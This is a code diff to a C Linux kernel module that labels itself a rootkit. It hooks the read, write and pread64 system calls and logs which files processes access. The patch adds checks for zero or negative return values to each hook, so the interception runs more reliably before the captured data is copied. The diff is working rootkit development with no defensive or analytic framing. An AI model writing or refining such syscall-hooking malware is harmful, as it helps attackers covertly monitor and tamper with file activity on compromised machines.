@@ -79,6 +79,17 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
 
+    IF_U (l_ret <= 0) {
+        // No data read or error, return immediately
+        IF_L (l_ret == 0) {
+            pr_info("[ROOTKIT] * No data read\n");
+        }
+        else {
+            pr_err("[ROOTKIT] * Error: %ld\n", l_ret);
+        }
+        return l_ret;
+    }
+
     s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
     IF_U (s_data == NULL) {
@@ -121,6 +132,17 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
     }
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
+
+    IF_U (l_ret <= 0) {
+        // No data written or error, return immediately
+        IF_L (l_ret == 0) {
+            pr_info("[ROOTKIT] * No data written\n");
+        }
+        else {
+            pr_err("[ROOTKIT] * Error: %ld\n", l_ret);
+        }
+        return l_ret;
+    }
 
     s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
@@ -188,6 +210,17 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
     }
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
+
+    IF_U (l_ret <= 0) {
+        // No data read or error, return immediately
+        IF_L (l_ret == 0) {
+            pr_info("[ROOTKIT] * No data read\n");
+        }
+        else {
+            pr_err("[ROOTKIT] * Error: %ld\n", l_ret);
+        }
+        return l_ret;
+    }
 
     s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
